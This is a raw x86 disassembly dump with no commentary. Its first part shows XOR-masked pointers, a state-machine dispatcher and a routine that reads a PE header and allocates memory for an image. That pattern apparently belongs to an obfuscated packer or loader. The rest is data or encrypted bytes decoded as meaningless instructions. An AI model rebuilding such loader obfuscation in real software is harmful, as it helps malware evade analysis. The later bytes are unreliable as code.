  420648:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729c]
  42064f:	cmp    cl,al
  420651:	jne    0x42072b
  420657:	mov    eax,DWORD PTR [ebp+0xc]
  42065a:	mov    eax,DWORD PTR [eax]
  42065c:	xor    eax,edi
  42065e:	mov    al,BYTE PTR [ebp+eax*1+0x327298]
  420665:	mov    ecx,DWORD PTR [ebp-0x10]
  420668:	mov    ecx,DWORD PTR [ecx]
  42066a:	xor    ecx,edi
  42066c:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  420673:	xor    al,cl
  420675:	mov    ecx,DWORD PTR [ebp-0x14]
  420678:	mov    ecx,DWORD PTR [ecx]
  42067a:	xor    ecx,edi
  42067c:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  420683:	or     al,cl
  420685:	mov    ecx,DWORD PTR [ebp-0x10]
  420688:	mov    ecx,DWORD PTR [ecx]
  42068a:	xor    ecx,edi
  42068c:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729c]
  420693:	cmp    cl,al
  420695:	jne    0x42072b
  42069b:	mov    eax,DWORD PTR [ebp-0x14]
  42069e:	mov    eax,DWORD PTR [eax]
  4206a0:	xor    eax,edi
  4206a2:	mov    al,BYTE PTR [ebp+eax*1+0x327298]
  4206a9:	mov    ecx,DWORD PTR [ebp+0xc]
  4206ac:	mov    ecx,DWORD PTR [ecx]
  4206ae:	xor    ecx,edi
  4206b0:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  4206b7:	xor    al,cl
  4206b9:	mov    ecx,DWORD PTR [ebp-0xc]
  4206bc:	mov    ecx,DWORD PTR [ecx]
  4206be:	xor    ecx,edi
  4206c0:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  4206c7:	or     al,cl
  4206c9:	mov    ecx,DWORD PTR [ebp+0xc]
  4206cc:	mov    ecx,DWORD PTR [ecx]
  4206ce:	xor    ecx,edi
  4206d0:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729c]
  4206d7:	cmp    cl,al
  4206d9:	jne    0x42072b
  4206db:	mov    eax,DWORD PTR [ebp-0x14]
  4206de:	mov    eax,DWORD PTR [eax]
  4206e0:	xor    eax,edi
  4206e2:	mov    al,BYTE PTR [ebp+eax*1+0x327298]
  4206e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4206ec:	mov    ecx,DWORD PTR [ecx]
  4206ee:	xor    ecx,edi
  4206f0:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  4206f7:	xor    al,cl
  4206f9:	mov    ecx,DWORD PTR [ebp-0x10]
  4206fc:	mov    ecx,DWORD PTR [ecx]
  4206fe:	xor    ecx,edi
  420700:	mov    cl,BYTE PTR [ebp+ecx*1+0x327298]
  420707:	or     al,cl
  420709:	mov    ecx,DWORD PTR [ebp-0x14]
  42070c:	mov    ecx,DWORD PTR [ecx]
  42070e:	xor    ecx,edi
  420710:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729c]
  420717:	cmp    cl,al
  420719:	jne    0x42072b
  42071b:	lea    eax,[ebp-0x4c]
  42071e:	push   eax
  42071f:	call   0x4201e6
  420724:	mov    ecx,DWORD PTR [ebp-0x44]
  420727:	cmp    eax,ecx
  420729:	je     0x420735
  42072b:	mov    eax,DWORD PTR [ebp+0x8]
  42072e:	xor    eax,edi
  420730:	add    eax,ebx
  420732:	mov    DWORD PTR [ebp+0x18],eax
  420735:	mov    eax,DWORD PTR [ebp-0x8]
  420738:	xor    eax,edi
  42073a:	lea    eax,[eax+esi*1+0x3272e4]
  420741:	xor    eax,edi
  420743:	mov    ecx,DWORD PTR [ebp+0x8]
  420746:	mov    edx,DWORD PTR [ebp+0x18]
  420749:	xor    ecx,edi
  42074b:	add    ecx,ebx
  42074d:	cmp    edx,ecx
  42074f:	je     0x42054c
  420755:	mov    eax,DWORD PTR [ebp+0x8]
  420758:	mov    ecx,DWORD PTR [ebp+0x18]
  42075b:	xor    eax,edi
  42075d:	add    eax,ebx
  42075f:	cmp    ecx,eax
  420761:	jne    0x420774
  420763:	mov    eax,DWORD PTR [ebp-0x8]
  420766:	mov    ecx,DWORD PTR [ebp+0x1c]
  420769:	xor    eax,edi
  42076b:	lea    eax,[eax+ecx*1+0x3272e4]
  420772:	jmp    0x4207eb
  420774:	push   0x18
  420776:	push   DWORD PTR [ebp-0x4]
  420779:	lea    eax,[ebp-0x64]
  42077c:	push   eax
  42077d:	call   0x41fa5f
  420782:	mov    eax,DWORD PTR [ebp+0x8]
  420785:	mov    ecx,DWORD PTR [ebp-0x18]
  420788:	xor    eax,edi
  42078a:	add    eax,ebx
  42078c:	cmp    eax,ecx
  42078e:	je     0x4207a3
  420790:	mov    eax,DWORD PTR [ebp+0x8]
  420793:	xor    eax,edi
  420795:	add    eax,ebx
  420797:	push   eax
  420798:	push   0x18
  42079a:	lea    eax,[ebp-0x64]
  42079d:	push   eax
  42079e:	call   0x420045
  4207a3:	mov    eax,DWORD PTR [ebp-0x4]
  4207a6:	add    eax,0x18
  4207a9:	mov    DWORD PTR [ebp+0x18],eax
  4207ac:	push   DWORD PTR [ebp-0x50]
  4207af:	push   DWORD PTR [ebp+0x18]
  4207b2:	mov    eax,DWORD PTR [ebp-0x54]
  4207b5:	add    eax,DWORD PTR [ebp-0x20]
  4207b8:	push   eax
  4207b9:	call   0x41fa5f
  4207be:	mov    eax,DWORD PTR [ebp+0x8]
  4207c1:	mov    ecx,DWORD PTR [ebp-0x18]
  4207c4:	xor    eax,edi
  4207c6:	add    eax,ebx
  4207c8:	cmp    eax,ecx
  4207ca:	je     0x4207dd
  4207cc:	push   0x0
  4207ce:	push   DWORD PTR [ebp-0x50]
  4207d1:	mov    eax,DWORD PTR [ebp-0x54]
  4207d4:	add    eax,DWORD PTR [ebp-0x20]
  4207d7:	push   eax
  4207d8:	call   0x420045
  4207dd:	mov    eax,DWORD PTR [ebp-0x24]
  4207e0:	mov    ecx,DWORD PTR [ebp-0x50]
  4207e3:	add    DWORD PTR [eax],ecx
  4207e5:	mov    eax,DWORD PTR [ebp-0x50]
  4207e8:	add    eax,DWORD PTR [ebp+0x1c]
  4207eb:	mov    DWORD PTR [ebp+0x1c],eax
  4207ee:	mov    eax,DWORD PTR [ebp-0x8]
  4207f1:	mov    ecx,DWORD PTR [ebp+0x1c]
  4207f4:	xor    eax,edi
  4207f6:	add    eax,ebx
  4207f8:	imul   eax,ecx
  4207fb:	mov    ecx,DWORD PTR [ebp+0x8]
  4207fe:	mov    edx,DWORD PTR [ebp-0x28]
  420801:	xor    ecx,edi
  420803:	lea    ecx,[ecx+edx*1+0x3272e4]
  42080a:	cmp    eax,ecx
  42080c:	jb     0x42046a
  420812:	mov    esi,DWORD PTR [ebp+0x14]
  420815:	mov    eax,DWORD PTR [ebp-0x20]
  420818:	mov    DWORD PTR [esi],eax
  42081a:	jmp    0x420861
  42081c:	mov    ecx,DWORD PTR [ebp+0x8]
  42081f:	mov    edx,DWORD PTR [ebp+0xc]
  420822:	xor    ecx,edi
  420824:	xor    edx,edi
  420826:	add    ecx,ebx
  420828:	add    edx,ebx
  42082a:	cmp    ecx,edx
  42082c:	jne    0x420840
  42082e:	mov    eax,ds:0x7f642d1e
  420833:	imul   eax,eax,0x9f15fcef
  420839:	mov    ds:0x7f642d1e,eax
  42083e:	jmp    0x420861
  420840:	mov    ecx,DWORD PTR [ebp+0x8]
  420843:	xor    ecx,edi
  420845:	add    ecx,ebx
  420847:	cmp    eax,ecx
  420849:	je     0x420857
  42084b:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  420855:	jmp    0x420861
  420857:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  420861:	pop    edi
  420862:	pop    esi
  420863:	pop    ebx
  420864:	leave  
  420865:	ret    0x18
  420868:	push   ebp
  420869:	mov    ebp,esp
  42086b:	and    esp,0xfffffff8
  42086e:	mov    eax,DWORD PTR [ebp+0x20]
  420871:	sub    esp,0x14
  420874:	push   ebx
  420875:	mov    ebx,DWORD PTR [ebp+0x14]
  420878:	push   esi
  420879:	push   edi
  42087a:	cmp    eax,0xf89c8581
  42087f:	jne    0x42088b
  420881:	push   0xf89c8580
  420886:	jmp    0x4209bd
  42088b:	mov    eax,DWORD PTR [ebp+0x20]
  42088e:	cmp    eax,0xf89c8580
  420893:	jne    0x42089f
  420895:	push   0xf89c8583
  42089a:	jmp    0x4209bd
  42089f:	mov    eax,DWORD PTR [ebp+0x20]
  4208a2:	cmp    eax,0xf89c8583
  4208a7:	jne    0x4208b3
  4208a9:	push   0xf89c8582
  4208ae:	jmp    0x4209bd
  4208b3:	mov    eax,DWORD PTR [ebp+0x20]
  4208b6:	cmp    eax,0xf89c8582
  4208bb:	jne    0x4208c7
  4208bd:	push   0xf89c85bd
  4208c2:	jmp    0x4209bd
  4208c7:	mov    ecx,DWORD PTR [ebp+0x20]
  4208ca:	mov    eax,0xf89c85be
  4208cf:	cmp    ecx,eax
  4208d1:	jne    0x42098d
  4208d7:	mov    eax,DWORD PTR [ebp+0x10]
  4208da:	mov    DWORD PTR [esp+0xc],eax
  4208de:	mov    eax,DWORD PTR [ebp+0x18]
  4208e1:	mov    DWORD PTR [esp+0x14],eax
  4208e5:	mov    eax,DWORD PTR [ebp+0xc]
  4208e8:	mov    DWORD PTR [esp+0x18],eax
  4208ec:	mov    eax,DWORD PTR [ebp+0x8]
  4208ef:	mov    DWORD PTR [esp+0x10],eax
  4208f3:	mov    eax,DWORD PTR [esp+0x10]
  4208f7:	mov    ecx,DWORD PTR [esp+0x14]
  4208fb:	mov    edi,0x751089d
  420900:	xor    eax,edi
  420902:	mov    esi,0x3272e4
  420907:	add    eax,esi
  420909:	mov    DWORD PTR [ecx],eax
  42090b:	mov    eax,DWORD PTR [esp+0xc]
  42090f:	mov    eax,DWORD PTR [eax+0x194]
  420915:	mov    ecx,DWORD PTR [eax]
  420917:	mov    eax,DWORD PTR [esp+0xc]
  42091b:	mov    eax,DWORD PTR [eax+0x194]
  420921:	mov    eax,DWORD PTR [eax]
  420923:	add    eax,DWORD PTR [ecx+0x3c]
  420926:	mov    ecx,DWORD PTR [esp+0xc]
  42092a:	mov    ecx,DWORD PTR [ecx+0x1d8]
  420930:	mov    ecx,DWORD PTR [ecx+0x14]
  420933:	push   0x4
  420935:	push   0x3000
  42093a:	push   DWORD PTR [eax+0x50]
  42093d:	push   0x0
  42093f:	call   ecx
  420941:	mov    DWORD PTR [ebx],eax
  420943:	mov    eax,DWORD PTR [esp+0x10]
  420947:	push   DWORD PTR [esp+0xc]
  42094b:	xor    eax,edi
  42094d:	add    eax,esi
  42094f:	mov    DWORD PTR [esp+0x20],eax
  420953:	lea    eax,[esp+0x20]
  420957:	push   eax
  420958:	push   ebx
  420959:	push   DWORD PTR [esp+0x20]
  42095d:	push   DWORD PTR [esp+0x28]
  420961:	push   DWORD PTR [esp+0x24]
  420965:	call   0x42032a
  42096a:	mov    eax,DWORD PTR [esp+0x10]
  42096e:	mov    ecx,DWORD PTR [ebx]
  420970:	xor    eax,edi
  420972:	add    eax,esi
  420974:	cmp    ecx,eax
  420976:	je     0x4209d4
  420978:	mov    eax,DWORD PTR [esp+0x18]
  42097c:	mov    ecx,DWORD PTR [esp+0x14]
  420980:	xor    eax,edi
  420982:	add    eax,esi
  420984:	imul   eax,DWORD PTR [esp+0x1c]
  420989:	mov    DWORD PTR [ecx],eax
  42098b:	jmp    0x4209d4
  42098d:	mov    ecx,DWORD PTR [ebp+0x20]
  420990:	cmp    ecx,0xf89c85bd
  420996:	jne    0x42099f
  420998:	push   0xf89c85bc
  42099d:	jmp    0x4209bd
  42099f:	mov    ecx,DWORD PTR [ebp+0x20]
  4209a2:	cmp    ecx,0xf89c85bc
  4209a8:	jne    0x4209b1
  4209aa:	push   0xf89c85bf
  4209af:	jmp    0x4209bd
  4209b1:	mov    ecx,DWORD PTR [ebp+0x20]
  4209b4:	cmp    ecx,0xf89c85bf
  4209ba:	jne    0x4209d4
  4209bc:	push   eax
  4209bd:	push   DWORD PTR [ebp+0x1c]
  4209c0:	push   DWORD PTR [ebp+0x18]
  4209c3:	push   ebx
  4209c4:	push   DWORD PTR [ebp+0x10]
  4209c7:	push   DWORD PTR [ebp+0xc]
  4209ca:	push   DWORD PTR [ebp+0x8]
  4209cd:	call   0x420868
  4209d2:	mov    DWORD PTR [ebx],eax
  4209d4:	mov    eax,DWORD PTR [ebx]
  4209d6:	pop    edi
  4209d7:	pop    esi
  4209d8:	pop    ebx
  4209d9:	mov    esp,ebp
  4209db:	pop    ebp
  4209dc:	ret    0x1c
  4209df:	push   ebp
  4209e0:	mov    ebp,esp
  4209e2:	sub    esp,0xc
  4209e5:	mov    eax,0xf89c8581
  4209ea:	mov    DWORD PTR [ebp-0x8],eax
  4209ed:	mov    DWORD PTR [ebp-0xc],0xf89c8580
  4209f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4209f7:	xor    ecx,0x751089d
  4209fd:	add    ecx,0x3272e4
  420a03:	mov    DWORD PTR [ebp-0x4],ecx
  420a06:	mov    ecx,DWORD PTR [ebp+0xc]
  420a09:	push   eax
  420a0a:	mov    DWORD PTR [ebp+0xc],ecx
  420a0d:	push   DWORD PTR [ebp+0xc]
  420a10:	lea    eax,[ebp-0x4]
  420a13:	push   DWORD PTR [ebp+0x8]
  420a16:	push   eax
  420a17:	push   DWORD PTR [ebp+0xc]
  420a1a:	push   DWORD PTR [ebp-0xc]
  420a1d:	push   DWORD PTR [ebp-0x8]
  420a20:	call   0x420868
  420a25:	mov    DWORD PTR [ebp-0x4],eax
  420a28:	mov    eax,DWORD PTR [ebp-0x4]
  420a2b:	leave  
  420a2c:	ret    0x8
  420a2f:	dec    esp
  420a30:	inc    ecx
  420a31:	mov    ebp,0xeffebd16
  420a36:	pop    ebx
  420a37:	adc    DWORD PTR [eax],eax
  420a39:	ret    0x6572
  420a3c:	(bad)  
  420a3d:	mov    esi,DWORD PTR [edi+0x186a5]
  420a43:	out    0x1,eax
  420a45:	add    BYTE PTR [eax],al
  420a47:	xchg   esi,eax
  420a48:	out    0x8d,eax
  420a4a:	and    ecx,DWORD PTR [esi+0x2e]
  420a4d:	dec    esp
  420a4e:	test   BYTE PTR [edi-0x58df8406],ch
  420a54:	add    edi,edx
  420a56:	fs clc 
  420a58:	rcr    BYTE PTR [edx-0x53],1
  420a5b:	(bad)  
  420a5d:	test   al,0x1e
  420a5f:	push   esp
  420a60:	sahf   
  420a61:	adc    ebp,DWORD PTR [esi]
  420a63:	cmp    al,0xc5
  420a65:	xchg   edi,eax
  420a66:	pop    ss
  420a67:	test   al,0x1
  420a69:	sbb    ah,bl
  420a6b:	call   0xd4b5:0x1d02197c
  420a72:	xor    bh,BYTE PTR [eax-0x1d8fa12a]
  420a78:	mov    edx,0xa87f1ab2
  420a7d:	inc    ecx
  420a7e:	jnp    0x420a1d
  420a80:	xchg   esp,eax
  420a81:	bound  edi,QWORD PTR ds:0xd5908611
  420a87:	push   ebp
  420a88:	mov    ds:0xfd790c0,eax
  420a8d:	hlt    
  420a8e:	in     al,0xcb
  420a90:	xor    eax,0xb6e4e93
  420a95:	mov    ds:0x3a8bb6f,eax
  420a9a:	fst    QWORD PTR [ebp+0x512c4292]
  420aa0:	mov    esp,0x8b94a7c1
  420aa5:	mov    BYTE PTR [ecx+0x4a],bl
  420aa8:	mov    DWORD PTR [eax+0x1e62c234],eax
  420aae:	aam    0x9d
  420ab0:	or     WORD PTR [edx],sp
  420ab3:	xor    al,0x8e
  420ab5:	xchg   edi,eax
  420ab6:	loopne 0x420a9e
  420ab8:	pop    esi
  420ab9:	leave  
  420aba:	mov    esi,0x876e4824
  420abf:	xchg   ebx,eax
  420ac0:	and    eax,0xa9e11cd2
  420ac5:	jge    0x420b2e
  420ac7:	or     eax,0x4bed39cf
  420acc:	push   ebp
  420acd:	pop    ds
  420ace:	aas    
  420acf:	cs in  al,dx
  420ad1:	push   cs
  420ad2:	jnp    0x420a5e
  420ad4:	mov    al,0xef
  420ad6:	or     al,0x1c
  420ad8:	sbb    DWORD PTR [ebx],esi
  420ada:	(bad)  
  420adb:	jbe    0x420b26
  420add:	jge    0x420b3a
  420adf:	icebp  
  420ae0:	arpl   WORD PTR [ecx+0x4efaabd1],bp
  420ae6:	lods   eax,DWORD PTR ds:[esi]
  420ae8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ae9:	in     eax,dx
  420aea:	xchg   BYTE PTR [edi],dl
  420aec:	jg     0x420a90
  420aee:	sub    ebx,DWORD PTR [edi-0x72]
  420af1:	ror    DWORD PTR [esi+0x43],1
  420af4:	out    0x7f,eax
  420af6:	(bad)  
  420af7:	(bad)  
  420af8:	jne    0x420abb
  420afa:	aam    0x87
  420afc:	adc    DWORD PTR [ecx+0x38c2fa8d],edx
  420b02:	dec    ebp
  420b03:	mov    dl,0x25
  420b05:	lea    esp,[ecx+0x12004096]
  420b0b:	jns    0x420b1c
  420b0d:	and    al,0x53
  420b0f:	push   eax
  420b10:	aaa    
  420b11:	add    eax,0xceebf3fd
  420b16:	in     al,0xbc
  420b18:	cmp    dh,bl
  420b1a:	fisttp QWORD PTR [edx+eax*2+0x1c65b1d7]
  420b21:	and    DWORD PTR ds:0x8c49a3d4,0xffffffa1
  420b28:	xchg   edx,eax
  420b29:	mov    DWORD PTR [edx],esp
  420b2b:	jmp    0x53ba3a8b
  420b30:	repnz loop 0x420ae3
  420b33:	or     esp,DWORD PTR ds:0xf7604cb4
  420b39:	ins    BYTE PTR es:[edi],dx
  420b3a:	(bad)  
  420b3b:	push   eax
  420b3c:	xor    eax,0x19c920d7
  420b41:	sub    dh,BYTE PTR [edi-0x12]
  420b44:	cmp    eax,0xf2a7094e
  420b49:	jbe    0x420b33
  420b4b:	or     BYTE PTR [ebp-0x45],al
  420b4e:	add    al,0xa1
  420b50:	add    ebp,edi
  420b52:	or     BYTE PTR [ebp-0x32e7b321],ch
  420b58:	leave  
  420b59:	mov    ebx,0xd5af0f4
  420b5e:	out    dx,eax
  420b5f:	mov    edi,0x71ea2ea3
  420b64:	(bad)  
  420b65:	jmp    0xd20f:0x7ede22c8
  420b6c:	(bad)  
  420b6d:	fist   DWORD PTR [edi+0x4e5de9b7]
  420b73:	jbe    0x420b8c
  420b75:	in     eax,dx
  420b76:	push   ebx
  420b77:	mov    ch,0x1b
  420b79:	lea    esi,[edx+0x1c]
  420b7c:	cmp    esi,esp
  420b7e:	lock push 0xae90e28e
  420b84:	aam    0x1c
  420b86:	mov    BYTE PTR [ebx-0x59b520e8],ch
  420b8c:	sub    eax,0x6fd46df6
  420b91:	cmp    eax,0xdc4b38e3
  420b96:	sub    al,0x20
  420b98:	out    dx,al
  420b99:	cmp    bh,ah
  420b9b:	adc    ch,BYTE PTR [edi-0x77]
  420b9e:	mov    eax,0xc96122b5
  420ba3:	add    ecx,0x23818942
  420ba9:	out    0x1d,eax
  420bab:	or     eax,0x29d81760
  420bb0:	aam    0x8f
  420bb2:	jno    0x420b96
  420bb4:	sbb    esp,DWORD PTR [edi]
  420bb6:	mov    edx,0x1136d204
  420bbb:	sbb    ecx,esp
  420bbd:	pop    ds
  420bbe:	push   cs
  420bbf:	jmp    0x2451cece
  420bc4:	out    dx,eax
  420bc5:	sub    edx,ebp
  420bc7:	gs test ch,ch
  420bca:	jae    0x420b54
  420bcc:	cmc    
  420bcd:	pop    esp
  420bce:	push   eax
  420bcf:	cmp    ebx,esi
  420bd1:	neg    BYTE PTR [ebp-0x55]
  420bd4:	push   ds
  420bd5:	xchg   esi,eax
  420bd6:	stos   DWORD PTR es:[edi],eax
  420bd7:	clc    
  420bd8:	scas   al,BYTE PTR es:[edi]
  420bd9:	push   es
  420bda:	(bad)  
  420bdb:	sub    ch,BYTE PTR [edi]
  420bdd:	push   0xa8b09878
  420be2:	sub    eax,DWORD PTR [bx+di]
  420be5:	jle    0x420b74
  420be7:	xchg   edi,eax
  420be8:	sbb    DWORD PTR ds:0x178d8573,0x9
  420bef:	retf   0x3b40
  420bf2:	push   edi
  420bf3:	or     esi,DWORD PTR [ebp+0x7bd5ac41]
  420bf9:	icebp  
  420bfa:	stc    
  420bfb:	sbb    al,BYTE PTR [edx]
  420bfd:	int    0x73
  420bff:	jmp    0x7adf:0xaf7b1e10
  420c06:	mov    edi,0xd9617b9
  420c0b:	icebp  
  420c0c:	push   ecx
  420c0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c0e:	lahf   
  420c0f:	sub    dl,BYTE PTR [edi]
  420c11:	push   edx
  420c12:	call   FWORD PTR [ebx+ebp*4+0x37]
  420c16:	shl    DWORD PTR [eax+0x6],cl
  420c19:	xor    ecx,DWORD PTR [ebx]
  420c1b:	lods   al,BYTE PTR ds:[esi]
  420c1c:	dec    eax
  420c1d:	pusha  
  420c1e:	lock mov DWORD PTR [esi],esp
  420c21:	dec    eax
  420c22:	rcr    DWORD PTR [edx-0x4ed9292e],0x2a
  420c29:	lds    ecx,FWORD PTR [edi+0x3cc9df]
  420c2f:	scas   al,BYTE PTR es:[edi]
  420c30:	add    ebx,ebp
  420c32:	mov    ds:0xdeeebef,eax
  420c37:	jle    0x420bd4
  420c39:	mov    edi,0xfef712ce
  420c3e:	popa   
  420c3f:	mov    WORD PTR [eax+0x1e70001],cs
  420c45:	add    BYTE PTR [eax],al
  420c47:	mov    al,ds:0xd354d84d
  420c4c:	push   0x39a9f46
  420c51:	cmp    BYTE PTR [edx-0x48],cl
  420c54:	dec    ecx
  420c55:	mov    ss:0xebfa77a8,al
  420c5b:	cmp    ecx,DWORD PTR [ecx]
  420c5d:	jp     0x420c56
  420c5f:	xchg   ebp,eax
  420c60:	push   cs
  420c61:	dec    ecx
  420c62:	jmp    0x2bc6:0xedc4a9d2
  420c69:	push   edi
  420c6a:	or     edx,DWORD PTR [ecx-0xb9153ef]
  420c70:	das    
  420c71:	aad    0x81
  420c73:	retf   
  420c74:	xor    eax,0x92674259
  420c79:	into   
  420c7a:	adc    dh,al
  420c7c:	dec    ebp
  420c7d:	add    BYTE PTR [edi+0x13],ch
  420c80:	and    eax,0x6036f6b8
  420c85:	sbb    ebx,DWORD PTR [esi-0x209e15aa]
  420c8b:	lahf   
  420c8c:	and    BYTE PTR [esi+edi*4],0xdb
  420c90:	push   0x6c
  420c92:	adc    bh,BYTE PTR [ebx-0x7d22f408]
  420c98:	gs ret 0x65fa
  420c9c:	lea    ebx,[ecx-0x31c79bde]
  420ca2:	iret   
  420ca3:	xor    BYTE PTR [ebp+0x1b894ef5],ch
  420ca9:	pusha  
  420caa:	js     0x420d2a
  420cac:	add    BYTE PTR [edi+0x22cd47d3],bl
  420cb2:	(bad)  
  420cb3:	rcr    BYTE PTR [eax-0x70],cl
  420cb6:	add    BYTE PTR [eax*2-0x66ecd704],0xdf
  420cbe:	mov    eax,0xd70f0f20
  420cc3:	pop    ds
  420cc4:	jg     0x420d38
  420cc6:	jo     0x420cd1
  420cc8:	sub    ecx,DWORD PTR [eax+0x4ae33c93]
  420cce:	push   edx
  420cd0:	data16 je 0x420ce5
  420cd3:	ds iret 
  420cd5:	pop    edx
  420cd6:	lahf   
  420cd7:	in     eax,dx
  420cd8:	adc    dl,dh
  420cda:	add    DWORD PTR [ebx+0x33],ebp
  420cdd:	dec    edi
  420cde:	push   eax
  420cdf:	mov    bh,0x1b
  420ce1:	sbb    BYTE PTR [ecx+0x40],ah
  420ce4:	fwait
  420ce5:	add    BYTE PTR [ebx+ebp*4-0x546a9dcc],ch
  420cec:	adc    al,0x28
  420cee:	fistp  QWORD PTR [edi+0x3d]
  420cf1:	cmp    BYTE PTR [ebx-0x9],bh
  420cf4:	and    cl,cl
  420cf6:	sbb    DWORD PTR [edx-0x51],eax
  420cf9:	into   
  420cfa:	ret    
  420cfb:	inc    edi
  420cfc:	cli    
  420cfd:	fcom   DWORD PTR [ebx+ecx*2+0x4f6f8e15]
  420d04:	cwde   
  420d05:	lods   eax,DWORD PTR ds:[esi]
  420d06:	xchg   DWORD PTR [esi+edx*4+0x6fad7b5d],ecx
  420d0d:	ins    BYTE PTR es:[edi],dx
  420d0e:	dec    eax
  420d0f:	mov    edi,0xec1f83ec
  420d14:	pop    ds
  420d15:	fwait
  420d16:	imul   ebp,DWORD PTR [eax-0x3a],0xc
  420d1a:	lea    edi,[edi+ebx*1]
  420d1d:	aaa    
  420d1e:	ud1    esi,DWORD PTR [ebp+0x15]
  420d22:	xchg   edx,eax
  420d23:	mov    ebp,0x56ac9d4f
  420d28:	loopne 0x420d38
  420d2a:	js     0x420cb9
  420d2c:	sbb    BYTE PTR [ebp+0x7355aa2d],bl
  420d32:	dec    ecx
  420d33:	mov    WORD PTR [esi],?
  420d35:	popf   
  420d36:	stos   BYTE PTR es:[edi],al
  420d37:	and    al,0x7
  420d39:	icebp  
  420d3a:	(bad)  
  420d3b:	push   ebx
  420d3c:	add    BYTE PTR [ebp-0x46],cl
  420d3f:	mov    esp,0x7f9748cd
  420d44:	adc    al,0xd2
  420d46:	dec    ecx
  420d47:	and    bh,BYTE PTR [esp+ebx*2-0x1bd92820]
  420d4e:	pusha  
  420d4f:	jmp    0x21c2:0xaf33bc81
  420d56:	mov    ebx,edi
  420d58:	xor    DWORD PTR [edx-0x73624549],esi
  420d5e:	jmp    0xe9b9a36e
  420d63:	stc    
  420d64:	mov    ebp,DWORD PTR [esi]
  420d66:	cmp    eax,DWORD PTR [ebx+0x4e]
  420d69:	out    0xdb,al
  420d6b:	call   0xf6d7fc77
  420d70:	xchg   edi,eax
  420d71:	in     al,0x1d
  420d73:	mov    ebp,0xf6734b7c
  420d78:	dec    edi
  420d79:	stc    
  420d7a:	adc    esi,DWORD PTR [ebx]
  420d7c:	mov    esi,0x6529c74f
  420d81:	xchg   ecx,eax
  420d82:	test   eax,0xd78e3400
  420d87:	xor    al,0xe3
  420d89:	cld    
  420d8a:	jne    0x420d93
  420d8c:	and    al,0x28
  420d8e:	mov    WORD PTR [ebp+0xa14a927],gs
  420d94:	cmp    ah,ch
  420d96:	fimul  DWORD PTR [esi]
  420d98:	and    ecx,0x750d98a2
  420d9e:	(bad)  
  420d9f:	lea    edi,[ecx+0x5b]
  420da2:	pop    esp
  420da3:	in     al,dx
  420da4:	jns    0x420d9d
  420da6:	shl    BYTE PTR [edi+0x4365b28b],cl
  420dac:	pop    ebx
  420dad:	in     al,dx
  420dae:	mov    WORD PTR [edi-0x46],cs
  420db1:	xor    esi,edx
  420db3:	xchg   ecx,eax
  420db4:	std    
  420db5:	call   0x52e3a2d6
  420dba:	test   DWORD PTR [esi-0x2042be26],ebx
  420dc0:	or     eax,0x9e5676ef
  420dc5:	xchg   edx,eax
  420dc6:	mov    si,0xac47
  420dca:	adc    DWORD PTR [esi+0x62ecebad],edi
  420dd0:	or     DWORD PTR [eax-0x25a4a7d],ecx
  420dd6:	xor    DWORD PTR [ebp-0x62],0x9ecfd33e
  420ddd:	pop    esi
  420dde:	repnz mov ds:0x3feb0464,al
  420de4:	test   al,0xc2
  420de6:	(bad)  
  420de7:	mov    cl,0x23
  420de9:	in     eax,dx
  420dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420deb:	xchg   edx,eax
  420dec:	fist   DWORD PTR [ebp+0x5a]
  420def:	sub    BYTE PTR [ebp+0x2a],bl
  420df2:	xor    BYTE PTR [edx+ebp*2],0x99
  420df6:	imul   esi,DWORD PTR [edi-0x397a0482],0x2e
  420dfd:	or     ah,BYTE PTR [ecx]
  420dff:	add    BYTE PTR [ebp-0x20],al
  420e02:	lods   eax,DWORD PTR ds:[esi]
  420e03:	pop    ds
  420e04:	mov    bl,0xe0
  420e06:	mov    ch,0x2b
  420e08:	and    edx,esp
  420e0a:	inc    ecx
  420e0b:	out    0xbe,eax
  420e0d:	test   BYTE PTR [esi+0x3f85e00d],ch
  420e13:	ret    
  420e14:	lea    edx,[esi-0x70]
  420e17:	ret    0xaed4
  420e1a:	push   ebx
  420e1b:	mov    BYTE PTR [esi],bh
  420e1d:	sar    bl,cl
  420e1f:	aad    0x9c
  420e21:	sub    ch,bl
  420e23:	in     eax,0x8b
  420e25:	out    dx,eax
  420e26:	call   0xf50f:0x78ce4ff8
  420e2d:	xchg   esi,eax
  420e2e:	add    ah,dl
  420e30:	mov    edi,0xedff8dd6
  420e35:	(bad)  
  420e37:	push   edx
  420e38:	js     0x420ead
  420e3a:	mov    esp,0x7c6cb2be
  420e3f:	jae    0x420dcb
  420e41:	add    DWORD PTR [eax],eax
  420e43:	out    0x1,eax
  420e45:	add    BYTE PTR [eax],al
  420e47:	adc    dl,BYTE PTR [esi+0x4dd05a56]
  420e4d:	cmp    DWORD PTR [edx-0x7836e687],edi
  420e53:	xchg   DWORD PTR [esi],eax
  420e55:	inc    ebp
  420e56:	push   ecx
  420e57:	adc    DWORD PTR [edi],edx
  420e59:	add    ecx,DWORD PTR [ebx-0x5f]
  420e5c:	xchg   ecx,eax
  420e5d:	in     eax,dx
  420e5e:	ret    0x9106
  420e61:	into   
  420e62:	out    dx,al
  420e63:	popa   
  420e64:	out    0x8b,al
  420e66:	cwde   
  420e67:	in     al,0xa7
  420e69:	sar    ah,cl
  420e6b:	mov    edi,eax
  420e6d:	sub    cl,BYTE PTR [ebx]
  420e6f:	cmp    DWORD PTR [edi+ebx*8],esp
  420e72:	mov    bh,0x8f
  420e74:	loop   0x420e3c
  420e76:	jnp    0x420e03
  420e78:	jmp    0xb2a301a9
  420e7d:	in     eax,dx
  420e7e:	(bad)  
  420e80:	xor    al,0x8d
  420e82:	pusha  
  420e83:	inc    esp
  420e84:	std    
  420e85:	lds    ecx,FWORD PTR [esi+edx*8-0x176ad2c8]
  420e8c:	jge    0x420ed4
